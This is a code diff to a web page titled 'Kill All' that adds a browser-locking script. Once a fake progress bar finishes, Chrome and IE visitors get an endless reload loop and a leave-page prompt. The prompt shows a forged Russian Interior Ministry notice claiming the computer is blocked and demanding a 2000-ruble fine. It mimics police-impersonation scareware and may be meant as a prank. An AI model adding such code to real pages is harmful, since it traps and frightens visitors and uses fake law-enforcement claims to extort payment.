@@ -18,6 +18,22 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
 
     <title>Kill All</title>
+
+    <script>
+        if (location.hash === '#block') {
+            onbeforeunload=function(){
+                location.reload();
+                return "ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН Министерством Внутренних Дел Российской Федерации согласно Постановлению 56 АН № 197_935001 от 23.11.2012 г. за попытку уничножения человечества. Информация о планировавшемся правнорушении передана  МВД РФ по городу Москва.\r\nПостановление по делу об администротивном правонарушении серия 56 АН №197_935001 от " + new Date().getDate() + '.' + (new Date().getMonth() + 1) + '.' + new Date().getFullYear() + '.\r\nНа вас наложен административный штраф в размере 2000 рублей 00 коп.\r\n-------------------------------------\r\nОплату штрафа переводить на номер Макса';
+            };
+            onload=function(){
+                document.getElementById('progressArea').style.display = 'block';
+                location.reload();
+            };
+            setInterval(function() {
+                location.reload();
+            });
+        }
+    </script>
 </head>
 <body>
     <div class="row" style="margin-top: 10%;">
@@ -66,13 +82,20 @@
                 progressNum.innerHTML = progress;
 
                 if (progress === 100) finilize();
-            }, 500);
+            }, 10);
 
             function finilize() {
                 clearInterval(timer);
 
                 setTimeout(function() {
-                    document.getElementById('final').style.display = 'block';
+                    var isChrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1 ||navigator.userAgent.toLowerCase().indexOf('ie') ;
+
+                    if (isChrome) {
+                        location.hash = 'block';
+                        location.reload();
+                    } else {
+                        document.getElementById('final').style.display = 'block';
+                    }
                 }, 500);
             }
         }
